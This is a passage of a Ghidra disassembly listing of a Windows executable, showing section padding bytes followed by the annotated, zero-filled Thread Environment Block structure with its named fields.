        00404196 41              ??         41h    A
        00404197 44              ??         44h    D
        00404198 44              ??         44h    D
        00404199 49              ??         49h    I
        0040419a 4e              ??         4Eh    N
        0040419b 47              ??         47h    G
        0040419c 50              ??         50h    P
        0040419d 41              ??         41h    A
        0040419e 44              ??         44h    D
        0040419f 44              ??         44h    D
        004041a0 49              ??         49h    I
        004041a1 4e              ??         4Eh    N
        004041a2 47              ??         47h    G
        004041a3 58              ??         58h    X
        004041a4 58              ??         58h    X
        004041a5 50              ??         50h    P
        004041a6 41              ??         41h    A
        004041a7 44              ??         44h    D
        004041a8 44              ??         44h    D
        004041a9 49              ??         49h    I
        004041aa 4e              ??         4Eh    N
        004041ab 47              ??         47h    G
        004041ac 50              ??         50h    P
        004041ad 41              ??         41h    A
        004041ae 44              ??         44h    D
        004041af 44              ??         44h    D
        004041b0 49              ??         49h    I
        004041b1 4e              ??         4Eh    N
        004041b2 47              ??         47h    G
        004041b3 58              ??         58h    X
        004041b4 58              ??         58h    X
        004041b5 50              ??         50h    P
        004041b6 41              ??         41h    A
        004041b7 44              ??         44h    D
        004041b8 44              ??         44h    D
        004041b9 49              ??         49h    I
        004041ba 4e              ??         4Eh    N
        004041bb 47              ??         47h    G
        004041bc 50              ??         50h    P
        004041bd 41              ??         41h    A
        004041be 44              ??         44h    D
        004041bf 44              ??         44h    D
        004041c0 49              ??         49h    I
        004041c1 4e              ??         4Eh    N
        004041c2 47              ??         47h    G
        004041c3 58              ??         58h    X
        004041c4 58              ??         58h    X
        004041c5 50              ??         50h    P
        004041c6 41              ??         41h    A
        004041c7 44              ??         44h    D
        004041c8 44              ??         44h    D
        004041c9 49              ??         49h    I
        004041ca 4e              ??         4Eh    N
        004041cb 47              ??         47h    G
        004041cc 50              ??         50h    P
        004041cd 41              ??         41h    A
        004041ce 44              ??         44h    D
        004041cf 44              ??         44h    D
        004041d0 49              ??         49h    I
        004041d1 4e              ??         4Eh    N
        004041d2 47              ??         47h    G
        004041d3 58              ??         58h    X
        004041d4 58              ??         58h    X
        004041d5 50              ??         50h    P
        004041d6 41              ??         41h    A
        004041d7 44              ??         44h    D
        004041d8 44              ??         44h    D
        004041d9 49              ??         49h    I
        004041da 4e              ??         4Eh    N
        004041db 47              ??         47h    G
        004041dc 50              ??         50h    P
        004041dd 41              ??         41h    A
        004041de 44              ??         44h    D
        004041df 44              ??         44h    D
        004041e0 49              ??         49h    I
        004041e1 4e              ??         4Eh    N
        004041e2 47              ??         47h    G
        004041e3 58              ??         58h    X
        004041e4 58              ??         58h    X
        004041e5 50              ??         50h    P
        004041e6 41              ??         41h    A
        004041e7 44              ??         44h    D
        004041e8 44              ??         44h    D
        004041e9 49              ??         49h    I
        004041ea 4e              ??         4Eh    N
        004041eb 47              ??         47h    G
        004041ec 50              ??         50h    P
        004041ed 41              ??         41h    A
        004041ee 44              ??         44h    D
        004041ef 44              ??         44h    D
        004041f0 49              ??         49h    I
        004041f1 4e              ??         4Eh    N
        004041f2 47              ??         47h    G
        004041f3 58              ??         58h    X
        004041f4 58              ??         58h    X
        004041f5 50              ??         50h    P
        004041f6 41              ??         41h    A
        004041f7 44              ??         44h    D
        004041f8 44              ??         44h    D
        004041f9 49              ??         49h    I
        004041fa 4e              ??         4Eh    N
        004041fb 47              ??         47h    G
        004041fc 50              ??         50h    P
        004041fd 41              ??         41h    A
        004041fe 44              ??         44h    D
        004041ff 44              ??         44h    D
                             //
                             // tdb
                             // ram:ffdff000-ram:ffdfffff
                             //
                             ExceptionList                                   XREF[3]:     entry:00401ce9(R),
                                                                                          entry:00401cf0(W), ffdff018(*)
        ffdff000 00 00 00 00     void *     00000000
                             StackBase
        ffdff004 00 00 00 00     void *     00000000
                             StackLimit
        ffdff008 00 00 00 00     void *     00000000
                             SubSystemTib
        ffdff00c 00 00 00 00     void *     00000000
                             FiberData
        ffdff010 00 00 00 00     void *     00000000
                             ArbitraryUserPointer
        ffdff014 00 00 00 00     void *     00000000
                             Self
        ffdff018 00 f0 df ff     void *     ExceptionList                                    = 00000000
                             EnvironmentPointer
        ffdff01c 00 00 00 00     void *     00000000
                             ClientId
        ffdff020 00 00 00        CLIENT_ID
                 00 00 00
                 00 00
                             ActiveRpcHandle
        ffdff028 00 00 00 00     void *     00000000
                             ThreadLocalStoragePointer
        ffdff02c 00 00 00 00     void *     00000000
                             ProcessEnvironmentBlock
        ffdff030 00 00 00 00     void *     00000000
                             LastErrorValue
        ffdff034 00 00 00 00     ddw        0h
                             CountOfOwnedCriticalSections
        ffdff038 00 00 00 00     ddw        0h
                             CsrClientThread
        ffdff03c 00 00 00 00     void *     00000000
                             Win32ThreadInfo
        ffdff040 00 00 00 00     void *     00000000
                             User32Reserved
        ffdff044 00 00 00        ddw[26]
                 00 00 00
                 00 00 00
                             UserReserved
        ffdff0ac 00 00 00        ddw[5]
                 00 00 00
                 00 00 00
                             WOW32Reserved
        ffdff0c0 00 00 00 00     void *     00000000
                             CurrentLocale
        ffdff0c4 00 00 00 00     ddw        0h
                             FpSoftwareStatusRegister
        ffdff0c8 00 00 00 00     ddw        0h
                             SystemReserved1
        ffdff0cc 00 00 00        void *[54]
                 00 00 00
                 00 00 00
                             ExceptionCode
        ffdff1a4 00 00 00 00     ddw        0h
                             ActivationContextStackPointer
        ffdff1a8 00 00 00 00     void *     00000000
                             SpareBytes
        ffdff1ac 00 00 00        uchar[36]  ""
                 00 00 00
                 00 00 00
                             TxFsContext
        ffdff1d0 00 00 00 00     ddw        0h
                             GdiTebBatch
        ffdff1d4 00 00 00 00     ddw        0h
        ffdff1d8 00              ??         00h

        ffdff6b0 00              ??         00h
        ffdff6b1 00              ??         00h
        ffdff6b2 00              ??         00h
        ffdff6b3 00              ??         00h
                             RealClientId
        ffdff6b4 00 00 00        CLIENT_ID
                 00 00 00
                 00 00
                             GdiCachedProcessHandle
        ffdff6bc 00 00 00 00     void *     00000000
                             GdiClientPID
        ffdff6c0 00 00 00 00     ddw        0h
                             GdiCLientTID
        ffdff6c4 00 00 00 00     ddw        0h
                             GdiThreadLocalInfo
        ffdff6c8 00 00 00 00     void *     00000000
                             Win32ClientInfo
        ffdff6cc 00 00 00        void *[62]
                 00 00 00
                 00 00 00
                             glDispatchTable
        ffdff7c4 00 00 00        void *[2
                 00 00 00
                 00 00 00
                             glReserved1
        ffdffb68 00 00 00        void *[29]
                 00 00 00
                 00 00 00
                             glReserved2
        ffdffbdc 00 00 00 00     void *     00000000
                             glSectionInfo
        ffdffbe0 00 00 00 00     void *     00000000
                             glSection
        ffdffbe4 00 00 00 00     void *     00000000
                             glTable
        ffdffbe8 00 00 00 00     void *     00000000
                             glCurrentRC
        ffdffbec 00 00 00 00     void *     00000000
                             glContext
        ffdffbf0 00 00 00 00     void *     00000000
                             LastStatusValue
        ffdffbf4 00 00 00 00     ddw        0h
        ffdffbf8 00              ??         00h
        ffdffbf9 00              ??         00h
        ffdffbfa 00              ??         00h
        ffdffbfb 00              ??         00h
        ffdffbfc 00              ??         00h
        ffdffbfd 00              ??         00h
        ffdffbfe 00              ??         00h
        ffdffbff 00              ??         00h
                             StaticUnicodeBuffer
        ffdffc00 00 00 00        wchar16[   u""
                 00 00 00
                 00 00 00
        ffdffe0a 00              ??         00h
        ffdffe0b 00              ??         00h
                             DeallocationStack
        ffdffe0c 00 00 00 00     void *     00000000
                             TlsSlots
        ffdffe10 00 00 00        void *[64]
                 00 00 00
                 00 00 00
                             TlsLinks.Flink
        ffdfff10 00 00 00 00     void *     00000000
                             TlsLinks.Blink
        ffdfff14 00 00 00 00     void *     00000000
                             Vdm
        ffdfff18 00 00 00 00     void *     00000000
                             ReservedForNtRpc
        ffdfff1c 00 00 00 00     void *     00000000
                             DbgSsReserved
        ffdfff20 00 00 00        void *[2]
                 00 00 00
                 00 00
                             HardErrorMode
        ffdfff28 00 00 00 00     ddw        0h
                             Instrumentation
        ffdfff2c 00 00 00        void *[9]
                 00 00 00
                 00 00 00
                             ActivityId
        ffdfff50 00 00 00        GUID       00000000-0000-0000-0000-000000000000
                 00 00 00
                 00 00 00
                             SubProcessTag
        ffdfff60 00 00 00 00     void *     00000000
                             EtwLocalData
        ffdfff64 00 00 00 00     void *     00000000
                             EtwTraceData
        ffdfff68 00 00 00 00     void *     00000000
                             WinSockData
        ffdfff6c 00 00 00 00     void *     00000000
                             GdiBatchCount
        ffdfff70 00 00 00 00     ddw        0h
                             IdealProcessorValue
        ffdfff74 00 00 00 00     ddw        0h
                             GuaranteedStackBytes
        ffdfff78 00 00 00 00     ddw        0h
                             ReservedForPerf
        ffdfff7c 00 00 00 00     void *     00000000
                             ReservedForOle
        ffdfff80 00 00 00 00     void *     00000000
                             WaitingOnLoaderLock
        ffdfff84 00 00 00 00     ddw        0h
                             SavedPriorityState
        ffdfff88 00 00 00 00     void *     00000000
                             SoftPatchPtr1
        ffdfff8c 00 00 00 00     void *     00000000
                             ThreadPoolData
        ffdfff90 00 00 00 00     void *     00000000
                             TlsExpansionSlots
        ffdfff94 00 00 00 00     void *     00000000
                             MuiGeneration
        ffdfff98 00 00 00 00     ddw        0h
                             IsImpersonating
        ffdfff9c 00 00 00 00     ddw        0h
                             NlsCache
        ffdfffa0 00 00 00 00     void *     00000000
                             pShimData
        ffdfffa4 00 00 00 00     void *     00000000
                             HeapVirtualAffinity
        ffdfffa8 00 00 00 00     ddw        0h
                             CurrentTransactionHandle
        ffdfffac 00 00 00 00     void *     00000000
                             ActiveFrame
        ffdfffb0 00 00 00 00     void *     00000000
                             FlsData
        ffdfffb4 00 00 00 00     void *     00000000
                             PreferredLanguages
        ffdfffb8 00 00 00 00     void *     00000000
                             UserPrefLanguages
        ffdfffbc 00 00 00 00     void *     00000000
                             MergedPrefLanguages
        ffdfffc0 00 00 00 00     void *     00000000
                             MuiImpersonation
        ffdfffc4 00 00 00 00     ddw        0h
                             CrossTebFlags
        ffdfffc8 00 00           ushort     0h
                             SameTebFlags
        ffdfffca 00 00           ushort     0h
                             TxnScopeEnterCallback
        ffdfffcc 00 00 00 00     void *     00000000
                             TxnScopeExitCallback
        ffdfffd0 00 00 00 00     void *     00000000
                             TxnScopeContext
        ffdfffd4 00 00 00 00     void *     00000000
                             LockCount
        ffdfffd8 00 00 00 00     ddw        0h
        ffdfffdc 00              ??         00h
        ffdfffdd 00              ??         00h
        ffdfffde 00              ??         00h
        ffdfffdf 00              ??         00h
                             ResourceRetValue
        ffdfffe0 00 00 00 00     void *     00000000
        ffdfffe4 00              ??         00h
        ffdfffe5 00              ??         00h
        ffdfffe6 00              ??         00h
        ffdfffe7 00              ??         00h
        ffdfffe8 00              ??         00h
        ffdfffe9 00              ??         00h
        ffdfffea 00              ??         00h
        ffdfffeb 00              ??         00h
        ffdfffec 00              ??         00h
        ffdfffed 00              ??         00h
        ffdfffee 00              ??         00h
        ffdfffef 00              ??         00h
        ffdffff0 00              ??         00h
        ffdffff1 00              ??         00h
        ffdffff2 00              ??         00h
        ffdffff3 00              ??         00h
        ffdffff4 00              ??         00h
        ffdffff5 00              ??         00h
        ffdffff6 00              ??         00h
        ffdffff7 00              ??         00h
        ffdffff8 00              ??         00h
        ffdffff9 00              ??         00h
        ffdffffa 00              ??         00h
        ffdffffb 00              ??         00h
        ffdffffc 00              ??         00h
        ffdffffd 00              ??         00h
        ffdffffe 00              ??         00h
        ffdfffff 00              ??         00h
